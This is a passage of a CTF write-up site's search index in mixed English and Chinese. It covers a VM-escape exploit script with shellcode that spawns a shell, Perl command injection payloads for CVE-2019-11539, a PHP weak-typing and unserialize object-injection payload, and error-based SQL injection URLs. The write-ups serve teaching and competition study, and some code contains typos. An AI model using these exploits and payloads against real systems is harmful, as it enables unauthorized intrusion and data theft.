static checking. payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4)","title":"Exploit"},{"location":"pwn/VMEscape/scvm/#leak","text":"We cannot leak address of vm- mem by original print like operations, because we can only input once. So, we need to leak vm- mem to a reg of this vm and use the instructions integrated into this vm ( sub or add is great). We the vm is inited, heap chunk for regs and funcs are allocated and then the struct vm is allocated, too. We can use sub to get the value of regs[0~0xff] . So, leak is done. We can also use this trick to modify the value of funs[i] to the one we like. However, remember that the operand size is 32 bits , not 64 bits. The arch of this executable elf is amd64 . So, we need to modify the value of a function ptr twice (low 32 bits and high 32 bits).","title":"Leak"},{"location":"pwn/VMEscape/scvm/#shellcode","text":"It is easy that the memory allocated for vm is marked as rwx , so we just need to set rip to the address of our vm mem.","title":"Shellcode"},{"location":"pwn/VMEscape/scvm/#exp","text":"from pwn import * local=1 pc= ./scvm aslr=True context.log_level=True context.arch = amd64 context.word_size = 64 context.os = linux context.endian = little if local==1: #p = process(pc,aslr=aslr,env={ LD_PRELOAD : ./libc.so.6 }) p = process(pc,aslr=aslr) gdb.attach(p) else: remote_addr=[ 172.16.9.45 , 17730] p=remote(remote_addr[0],remote_addr[1]) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a,b) def lg(s,addr): print( \\033[1;31;40m%20s-- 0x%x\\033[0m %(s,addr)) def gen_print(i, j=0, k=0): s = s += chr(7) s += chr(i) s += chr(j) s += chr(k) return s def gen_mov(i, j, k = 0): s = s += chr(6) s += chr(i) s += chr(j) s += chr(k) return s def gen_sub(i, j, k): s = s += chr(2) s += chr(i) s += chr(j) s += chr(k) return s def gen_add(i, j, k): s = s += chr(1) s += chr(i) s += chr(j) s += chr(k) return s def raddr(a=6): if(a==6): return u64(rv(a).ljust(8, \\x00 )) else: return u64(rl().strip( \\n ).ljust(8, \\x00 )) if __name__ == __main__ : payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4) payload+= gen_mov(0,0x80) payload+= gen_sub(2, 0x2e + 4, 2) payload+= gen_sub(3, 0x2f + 4, 3) for i in range(0, 0x12): payload+= gen_add(2, 0, 2) payload+= gen_sub(0x22, 0x22, 0x22) payload+= gen_sub(0x23, 0x23, 0x23) payload+= gen_sub(0x22, 0x2, 0x22) payload+= gen_sub(0x23, 0x3, 0x23) payload+= gen_print(0x10) payload = payload.ljust(0x900, \\x00 ) buf = buf += \\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73 buf += \\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89 buf += \\xe6\\xb0\\x3b\\x0f\\x05 payload+= buf #payload = payload.ljust(0xa0, \\x00 ) #payload+= p32( 0x11DA - 0x10A0) sn(payload) p.interactive()","title":"EXP"},{"location":"reverse/","text":"waiting","title":"home"},{"location":"reverse/#waiting","text":"","title":"waiting"},{"location":"web/","text":"waiting","title":"home"},{"location":"web/#waiting","text":"","title":"waiting"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/","text":"HITCON2019-luatic(CallMeCro) Vulnerable Point of Your Network :) Foreword Congratulations to myself, because I solved an international CTF questions for the first time(Although in the end it was master lanmao who reminded me of the proper way of writing payload). Examination Site Perl Command Injection CVE-2019-11539 Analysis As you view the source code through F12, you will find there is a hint !-- Hint for you : ) a href = diag.cgi diag.cgi /a a href = DSSafe.pm DSSafe.pm /a -- Then we open the diag.cgi to get its source code #!/usr/bin/perl use lib /var/www/html/ ; use strict ; use CGI () ; use DSSafe ; sub tcpdump_options_syntax_check { my $options = shift ; return $options if system ( timeout -s 9 2 /usr/bin/tcpdump -d $options /dev/null 2 1 ) == 0 ; return undef ; } print Content-type: text/html\\n\\n ; my $options = CGI::param ( options ) ; my $output = tcpdump_options_syntax_check ( $options ) ; # backdoor :) my $tpl = CGI::param ( tpl ) ; if ( length $tpl 0 index ( $tpl , .. ) == -1 ) { $tpl = ./tmp/ . $tpl . .thtml ; require ( $tpl ) ; } It is easy to see that there is a command injection.Now, we have to figure out what to do with it. Exploit It's easy to think about going to orange's blog since he is the author of it. https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html Here we found CVE-2019-11539 and its payload: -r $x = ls / ,system $x # 2 /data/runtime/tmp/tt/setcookie.thtml.ttc We'll modify it a little bit and try to commit /cgi-bin/diag.cgi?option = -r%24x%3d%22ls+-lt+%2f%22%2csystem%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro After we commit it,we will get this total 96 -rwsr-sr-x 1 root root 8520 Oct 11 23 :57 $READ_FLAG $ -r-------- 1 root root 49 Oct 11 23 :59 FLAG ..... And then I stopped.The \"cat\" command could not be used, and the execution of $READ_FLAG$ failed. Finally, master lanmao told me about perl's syntax problems.The final payload: /cgi-bin/diag.cgi?option = -r%24x%3d%2f%24%2f%2fREAD_FLAG%2f%24system%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro Response: HTTP/1.1 200 OK Date: Sun, 12 Oct 2019 07 :04:37 GMT Server: Apache/2.4.29 ( Ubuntu ) Content-Length: 50 Connection: close Content-Type: text/html hitcon { Now I m sure u saw my Bl4ck H4t p4p3r :P } laomao tql.","title":"hitcon2019-virtual-public-network"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#hitcon2019-luaticcallmecro","text":"Vulnerable Point of Your Network :)","title":"HITCON2019-luatic(CallMeCro)"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#foreword","text":"Congratulations to myself, because I solved an international CTF questions for the first time(Although in the end it was master lanmao who reminded me of the proper way of writing payload).","title":"Foreword"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#examination-site","text":"Perl Command Injection CVE-2019-11539","title":"Examination Site"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#analysis","text":"As you view the source code through F12, you will find there is a hint !-- Hint for you : ) a href = diag.cgi diag.cgi /a a href = DSSafe.pm DSSafe.pm /a -- Then we open the diag.cgi to get its source code #!/usr/bin/perl use lib /var/www/html/ ; use strict ; use CGI () ; use DSSafe ; sub tcpdump_options_syntax_check { my $options = shift ; return $options if system ( timeout -s 9 2 /usr/bin/tcpdump -d $options /dev/null 2 1 ) == 0 ; return undef ; } print Content-type: text/html\\n\\n ; my $options = CGI::param ( options ) ; my $output = tcpdump_options_syntax_check ( $options ) ; # backdoor :) my $tpl = CGI::param ( tpl ) ; if ( length $tpl 0 index ( $tpl , .. ) == -1 ) { $tpl = ./tmp/ . $tpl . .thtml ; require ( $tpl ) ; } It is easy to see that there is a command injection.Now, we have to figure out what to do with it.","title":"Analysis"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#exploit","text":"It's easy to think about going to orange's blog since he is the author of it. https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html Here we found CVE-2019-11539 and its payload: -r $x = ls / ,system $x # 2 /data/runtime/tmp/tt/setcookie.thtml.ttc We'll modify it a little bit and try to commit /cgi-bin/diag.cgi?option = -r%24x%3d%22ls+-lt+%2f%22%2csystem%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro After we commit it,we will get this total 96 -rwsr-sr-x 1 root root 8520 Oct 11 23 :57 $READ_FLAG $ -r-------- 1 root root 49 Oct 11 23 :59 FLAG ..... And then I stopped.The \"cat\" command could not be used, and the execution of $READ_FLAG$ failed. Finally, master lanmao told me about perl's syntax problems.The final payload: /cgi-bin/diag.cgi?option = -r%24x%3d%2f%24%2f%2fREAD_FLAG%2f%24system%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro Response: HTTP/1.1 200 OK Date: Sun, 12 Oct 2019 07 :04:37 GMT Server: Apache/2.4.29 ( Ubuntu ) Content-Length: 50 Connection: close Content-Type: text/html hitcon { Now I m sure u saw my Bl4ck H4t p4p3r :P } laomao tql.","title":"Exploit"},{"location":"web/PHP/WHUCTF-EasyPHP/","text":"WHUCTF Easy PHP \u7ed5\u8fc7 + \u53cd\u5e8f\u5217\u5316 Analysis Source Code ?php error_reporting(0); include flag.php ; highlight_file(__FILE__); if (!$_COOKIE[ admin ]) { exit( \\nNot authenticated.\\n ); } if (!preg_match( /^{ hash : [\\w\\ ]+}$/ , $_COOKIE[ admin ])){ exit( \u8fd8\u770b\u4e0d\u61c2\u6b63\u5219\u8868\u8fbe\u5f0f? \u8fd8\u4e0d\u5feb\u53bb\u767e\u5ea6! \\n ); } $session_data = json_decode($_COOKIE[ admin ], true); if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u8fd9\u91cc\u6709\u4e24\u4e2a\u7ed5\u8fc7\u70b9\uff1a 1\uff09\u9996\u5148\u6784\u9020\u5408\u9002\u7684 Cookie:admin={\"hash\": xxxx} \uff0c \u8fd9\u91cc\u7684 xxxx \u5fc5\u987b\u4e3a\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c \u4f46\u662f\u8fd9\u4e2a xxxx \u7684\u503c\u9700\u8981\u4e0e md5($flag) \u5f31\u76f8\u7b49\u3002 \u5206\u6790\u4e0b\u9762\u7684\u6e90\u7801\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u7ed3\u5408\u63d0\u793a\uff1a \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 00111110000000110000000101011110 \u5b83\u7ed9\u7684\u63d0\u793a\u5176\u5b9e\u662f\u5c06\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4e4b\u540e\u5f97\u5230\u7684\u7ed3\u679c\uff1a 00111110000000110000000101011110 \uff0c\u5176\u4e2d\u7684 echo(ord(MD5($flag)[$i]) 6); \u8f93\u51faflag md5\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4f4d\u540e\u7684\u7ed3\u679c\uff0c\u5206\u6790\u4e00\u4e0b\uff1a \u82e5\u662f\u5b57\u6bcd\u8f93\u51fa1\uff0c\u6570\u5b57\u8f93\u51fa0\uff0c\u6211\u4eec\u53ef\u4ee5\u5224\u65ad\u51faflag md5\u503c\u524d2\u4f4d\u5c0f\u4e8e64\u4e3a\u6570\u5b57\u3002\u518d\u901a\u8fc7php\u5f31\u7c7b\u578b\u6bd4\u8f83\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u5229\u7528burp\u4ece0\u523099\u7206\u7834\uff0c\u572861\u5c31\u53d1\u73b0\u7ed5\u8fc7\u4e86\u8fd9\u4e00\u9650\u5236\uff0c\u6240\u4ee5\u6700\u7ec8Cookie\u8bbe\u7f6e\u4e3a\uff1a Cookie:admin={\"hash\": 61} \u7ed5\u8fc7\u7b2c\u4e00\u5173\uff01\uff01\uff01 \u975e\u9884\u671f\uff1a \u8fd9\u4e0a\u9762\u662f\u4e00\u4e2a\u9884\u671f\u89e3\uff0c\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3\uff0c\u7531\u4e8e\u6b63\u5219\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u672c\u6765hash\u503c\u7684\u5185\u5bb9\u53ea\u5e94\u5141\u8bb8\u8f93\u5165md5\u5305\u542b\u7684\u5b57\u7b26\u5373[0-9a-f] \u82e5\u8f93\u5165\u503c\u4e3a admin={\"hash\": True} \uff0c\u4f7f\u7528json_decode\u53ef\u4ee5\u5c06hash\u503c\u89e3\u6790\u4e3a\u5e03\u5c14\u503cTrue\uff0c\u800c\u6211\u4eec\u77e5\u9053php\u5f31\u7c7b\u578b\u7279\u6027\uff1a \u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u90e8\u5206\u7ed5\u8fc7\u3002 unserialize \u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316\uff1a class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u53cd\u5e8f\u5217\u5316\u539f\u7406\u662f\u4f60\u6b63\u5e38\u5e8f\u5217\u5316\u51fa\u6765\u662f\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:5:\"Study\":0:{}} \u7136\u540e\u6539\u6210\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:4:\"Evil\":0:{}} \uff0c\u518d urlencode \u4e00\u4e0b\u3002 Payload ?php class WHUCTF { protected $stu; function __constsuct(){ $this- stu = new Evil(); } function __destruct(){ $this- stu- action(); } } class Study{ function action(){ echo CTF \u771f\u597d\u73a9~ ; } } class Evil{ function action(){ system( cat./flag.php ); } } $a = new WHUCTF(); echo serialize($a); // O:6: WHUCTF :1:{s:6: *stu ;N;} echo urlencode(serialize($a)); // O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D \u7ed3\u679c\uff1a dmsj.php?whuctf=O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D","title":"WHUCTF-EasyPHP"},{"location":"web/PHP/WHUCTF-EasyPHP/#whuctf-easy-php","text":"\u7ed5\u8fc7 + \u53cd\u5e8f\u5217\u5316","title":"WHUCTF Easy PHP"},{"location":"web/PHP/WHUCTF-EasyPHP/#analysis","text":"","title":"Analysis"},{"location":"web/PHP/WHUCTF-EasyPHP/#source-code","text":"?php error_reporting(0); include flag.php ; highlight_file(__FILE__); if (!$_COOKIE[ admin ]) { exit( \\nNot authenticated.\\n ); } if (!preg_match( /^{ hash : [\\w\\ ]+}$/ , $_COOKIE[ admin ])){ exit( \u8fd8\u770b\u4e0d\u61c2\u6b63\u5219\u8868\u8fbe\u5f0f? \u8fd8\u4e0d\u5feb\u53bb\u767e\u5ea6! \\n ); } $session_data = json_decode($_COOKIE[ admin ], true); if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u8fd9\u91cc\u6709\u4e24\u4e2a\u7ed5\u8fc7\u70b9\uff1a 1\uff09\u9996\u5148\u6784\u9020\u5408\u9002\u7684 Cookie:admin={\"hash\": xxxx} \uff0c \u8fd9\u91cc\u7684 xxxx \u5fc5\u987b\u4e3a\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c \u4f46\u662f\u8fd9\u4e2a xxxx \u7684\u503c\u9700\u8981\u4e0e md5($flag) \u5f31\u76f8\u7b49\u3002 \u5206\u6790\u4e0b\u9762\u7684\u6e90\u7801\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u7ed3\u5408\u63d0\u793a\uff1a \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 00111110000000110000000101011110 \u5b83\u7ed9\u7684\u63d0\u793a\u5176\u5b9e\u662f\u5c06\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4e4b\u540e\u5f97\u5230\u7684\u7ed3\u679c\uff1a 00111110000000110000000101011110 \uff0c\u5176\u4e2d\u7684 echo(ord(MD5($flag)[$i]) 6); \u8f93\u51faflag md5\u6bcf\u4e00\u4f4d\u53f3\u79fb6\u4f4d\u540e\u7684\u7ed3\u679c\uff0c\u5206\u6790\u4e00\u4e0b\uff1a \u82e5\u662f\u5b57\u6bcd\u8f93\u51fa1\uff0c\u6570\u5b57\u8f93\u51fa0\uff0c\u6211\u4eec\u53ef\u4ee5\u5224\u65ad\u51faflag md5\u503c\u524d2\u4f4d\u5c0f\u4e8e64\u4e3a\u6570\u5b57\u3002\u518d\u901a\u8fc7php\u5f31\u7c7b\u578b\u6bd4\u8f83\uff1a if ($session_data[ hash ] != strtoupper(MD5($flag))) { echo( \u7ed9\u4f60\u4e2a\u63d0\u793a\u5427 \\n ); for ($i = 0; $i 32; $i++) { echo(ord(MD5($flag)[$i]) 6); } exit( \\n ); } \u5229\u7528burp\u4ece0\u523099\u7206\u7834\uff0c\u572861\u5c31\u53d1\u73b0\u7ed5\u8fc7\u4e86\u8fd9\u4e00\u9650\u5236\uff0c\u6240\u4ee5\u6700\u7ec8Cookie\u8bbe\u7f6e\u4e3a\uff1a Cookie:admin={\"hash\": 61} \u7ed5\u8fc7\u7b2c\u4e00\u5173\uff01\uff01\uff01","title":"Source Code"},{"location":"web/PHP/WHUCTF-EasyPHP/#_1","text":"\u8fd9\u4e0a\u9762\u662f\u4e00\u4e2a\u9884\u671f\u89e3\uff0c\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3\uff0c\u7531\u4e8e\u6b63\u5219\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u672c\u6765hash\u503c\u7684\u5185\u5bb9\u53ea\u5e94\u5141\u8bb8\u8f93\u5165md5\u5305\u542b\u7684\u5b57\u7b26\u5373[0-9a-f] \u82e5\u8f93\u5165\u503c\u4e3a admin={\"hash\": True} \uff0c\u4f7f\u7528json_decode\u53ef\u4ee5\u5c06hash\u503c\u89e3\u6790\u4e3a\u5e03\u5c14\u503cTrue\uff0c\u800c\u6211\u4eec\u77e5\u9053php\u5f31\u7c7b\u578b\u7279\u6027\uff1a \u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u90e8\u5206\u7ed5\u8fc7\u3002","title":"\u975e\u9884\u671f\uff1a"},{"location":"web/PHP/WHUCTF-EasyPHP/#unserialize","text":"","title":"unserialize"},{"location":"web/PHP/WHUCTF-EasyPHP/#_2","text":"class WHUCTF { protected $stu; function __construct() { $this- stu = new Study(); } function __destruct() { $this- stu- action(); } } class Study { function action() { echo CTF \u771f\u597d\u73a9~ ; } } class Evil { function action() { system( cat ./flag.php ); } } echo \u8fd9\u4e48\u660e\u663e\u4e86,\u4f60\u61c2\u6211\u610f\u601d\u5427 ; unserialize($_GET[ whuctf ]); \u53cd\u5e8f\u5217\u5316\u539f\u7406\u662f\u4f60\u6b63\u5e38\u5e8f\u5217\u5316\u51fa\u6765\u662f\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:5:\"Study\":0:{}} \u7136\u540e\u6539\u6210\uff1a O:6:\"WHUCTF\":1:{s:6:\" * stu\";O:4:\"Evil\":0:{}} \uff0c\u518d urlencode \u4e00\u4e0b\u3002","title":"\u63a5\u4e0b\u6765\u5c31\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316\uff1a"},{"location":"web/PHP/WHUCTF-EasyPHP/#payload","text":"?php class WHUCTF { protected $stu; function __constsuct(){ $this- stu = new Evil(); } function __destruct(){ $this- stu- action(); } } class Study{ function action(){ echo CTF \u771f\u597d\u73a9~ ; } } class Evil{ function action(){ system( cat./flag.php ); } } $a = new WHUCTF(); echo serialize($a); // O:6: WHUCTF :1:{s:6: *stu ;N;} echo urlencode(serialize($a)); // O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D \u7ed3\u679c\uff1a dmsj.php?whuctf=O%3A6%3A%22WHUCTF%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00stu%22%3BN%3B%7D","title":"Payload"},{"location":"web/SQLi/RootersCTF-Babyweb/","text":"RootersCTF-Babyweb My junior dev just set up a password protected webpage. Can you get in? \u5206\u6790\u8fc7\u7a0b \u6253\u5f00\u94fe\u63a5\u63d0\u793a\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u662f18\u4f4d\uff0c\u5e76\u4e14\u8fc7\u6ee4\u6389\u4e86UNION SLEEP ' \" OR - BENCHMARK\u3002\u56e0\u6b64\u5229\u7528\u7206\u7834\u51fa\u5bc6\u7801\u662f\u6bd4\u8f83\u4e0d\u73b0\u5b9e\u7684\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u793a\u662f\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u3002\u770b\u5230\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u731c\u6d4b\u662f\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u6389\uff0c\u4fbf\u5c1d\u8bd5\u5bbd\u5b57\u8282\u6ce8\u5165\uff0c\u4f7f\u7528 %df%27 \u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u6ce8\u5165\u5931\u8d25\u3002 \u5e76\u4e14\u63d0\u793aUNION\u3001OR\u4e5f\u90fd\u88ab\u8fc7\u6ee4\uff0c\u539f\u672c\u60f3\u7740\u5229\u7528\u5927\u5c0f\u5199\u6216\u8005\u7f16\u7801\u7ed5\u8fc7\uff0c\u4f46\u662f\u5f15\u53f7\u65e2\u7136\u4e0d\u80fd\u6210\u529f\u7ed5\u8fc7\uff0c\u8bf4\u660e\u4e0d\u80fd\u7528\u95ed\u5408\u5f15\u53f7\u8fdb\u884c\u6ce8\u5165\u3002\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\u53d1\u73b0\u5229\u7528 extractvalue() \u51fd\u6570\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u6ce8\u5165,\u56e0\u6b64\u53ef\u4ee5\u7ed3\u5408concat\u51fd\u6570\u5b9e\u73b0\u6ce8\u5165\u3002 extractvalue() \uff1a\u51fd\u6570\u529f\u80fd\u662f\u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32\u3002 EXTRACTVALUE (XML_document, XPath_string); \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u6587\u4e2d\u4e3aDoc \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string (Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32) extractvalue\u6ce8\u5165\u7684\u539f\u7406\uff1a\u5982\u540cupdatexml\u4e00\u6837\uff0cextract\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8981\u6c42\u662fxpath\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u800c\u6211\u4eec\u8f93\u5165\u7684\u5e76\u4e0d\u662f\u3002\u6240\u4ee5\u62a5\u9519\u3002 \u6ce8\u5165\u8fc7\u7a0b 1\u3001\u7206\u5e93\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) br \u56de\u663eXPATH syntax error:~SQLinjection~\uff0c\u7206\u51fa\u4e86\u5e93\u540dSQLinjection 2\u3001\u7206\u8868\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) br \u56de\u663eXPATH syntax error:~users~\uff0c\u7206\u51fa\u4e86\u8868\u540dusers \u8fd9\u91cc\u9700\u8981\u8bf4\u540d\u4e00\u4e0b\uff0c\u7531\u4e8e\u5355\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u6545\u6ce8\u5165\u8bed\u53e5\u4e2d\u5982\u679c\u6709\u5b57\u7b26\u4e32\u9700\u8981\u5355\u53cc\u5f15\u53f7\uff0c\u5e94\u5f53\u5c3d\u91cf\u907f\u514d\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528\u67e5\u8be2\u8bed\u53e5\u7684\u591a\u91cd\u5229\u7528\u907f\u514d\uff0c\u5f53\u7136\u76f4\u63a5\u586b\u5e93\u540d\u4e5f\u662f\u4e0d\u9700\u8981\u5355\u53cc\u5f15\u53f7\u7684\uff08\u4e0b\u9762\u8868\u540d\u540c\u7406\uff09\u3002 3\u3001\u7206\u5217\u540d https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) br \u56de\u663eXPATH syntax error:~user\u3001uniqueid~\uff0c\u7206\u51fa\u5217\u540duser\u3001uniqueid\uff0c\u8fd9\u4e24\u4e2a\u5217\u91cc\u80af\u5b9a\u6709\u6211\u4eec\u9700\u8981\u7684\u91cd\u8981\u5185\u5bb9\u3002 4\u3001\u7206\u5b57\u6bb5 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(selcet uniqueid/user from users limit 1),0x7e)); br \u8fd9\u91cc\u5206\u4e24\u6b65\u5206\u522b\u7206\u51faadmin\u548c\u5176\u5bf9\u5e94\u768418\u4f4d\u7684uniqueid\uff0c\u62ff\u53bb\u5c1d\u8bd5\u767b\u5f55\uff0c\u6210\u529f\u767b\u8def\u5e76\u62ff\u5230flag\u3002 \u7531\u4e8e\u73af\u5883\u4e0d\u80fd\u590d\u73b0\uff0c\u505a\u9898\u7684\u65f6\u5019\u4e5f\u6ca1\u6709\u622a\u56fe\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d34\u51fa\u56fe\u7247\u3002 \u62a5\u9519\u6ce8\u5165\u53c2\u8003\u94fe\u63a5\uff1a https://www.jianshu.com/p/bf5edd484957","title":"RootersCTF-Babyweb"},{"location":"web/SQLi/RootersCTF-Babyweb/#rootersctf-babyweb","text":"My junior dev just set up a password protected webpage. Can you get in?","title":"RootersCTF-Babyweb"},{"location":"web/SQLi/RootersCTF-Babyweb/#_1","text":"\u6253\u5f00\u94fe\u63a5\u63d0\u793a\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u662f18\u4f4d\uff0c\u5e76\u4e14\u8fc7\u6ee4\u6389\u4e86UNION SLEEP ' \" OR - BENCHMARK\u3002\u56e0\u6b64\u5229\u7528\u7206\u7834\u51fa\u5bc6\u7801\u662f\u6bd4\u8f83\u4e0d\u73b0\u5b9e\u7684\uff0c\u7ed3\u5408\u9898\u76ee\u63d0\u793a\u662f\u4f7f\u7528\u6ce8\u5165\u65b9\u6cd5\u3002\u770b\u5230\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u731c\u6d4b\u662f\u88ab\u53cd\u659c\u6760\u8f6c\u4e49\u6389\uff0c\u4fbf\u5c1d\u8bd5\u5bbd\u5b57\u8282\u6ce8\u5165\uff0c\u4f7f\u7528 %df%27 \u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u6ce8\u5165\u5931\u8d25\u3002 \u5e76\u4e14\u63d0\u793aUNION\u3001OR\u4e5f\u90fd\u88ab\u8fc7\u6ee4\uff0c\u539f\u672c\u60f3\u7740\u5229\u7528\u5927\u5c0f\u5199\u6216\u8005\u7f16\u7801\u7ed5\u8fc7\uff0c\u4f46\u662f\u5f15\u53f7\u65e2\u7136\u4e0d\u80fd\u6210\u529f\u7ed5\u8fc7\uff0c\u8bf4\u660e\u4e0d\u80fd\u7528\u95ed\u5408\u5f15\u53f7\u8fdb\u884c\u6ce8\u5165\u3002\u7ecf\u8fc7\u591a\u6b21\u5c1d\u8bd5\u53d1\u73b0\u5229\u7528 extractvalue() \u51fd\u6570\u8fdb\u884c\u62a5\u9519\u6ce8\u5165\u53ef\u4ee5\u6210\u529f\u5b9e\u73b0\u6ce8\u5165,\u56e0\u6b64\u53ef\u4ee5\u7ed3\u5408concat\u51fd\u6570\u5b9e\u73b0\u6ce8\u5165\u3002 extractvalue() \uff1a\u51fd\u6570\u529f\u80fd\u662f\u4ece\u76ee\u6807XML\u4e2d\u8fd4\u56de\u5305\u542b\u6240\u67e5\u8be2\u503c\u7684\u5b57\u7b26\u4e32\u3002 EXTRACTVALUE (XML_document, XPath_string); 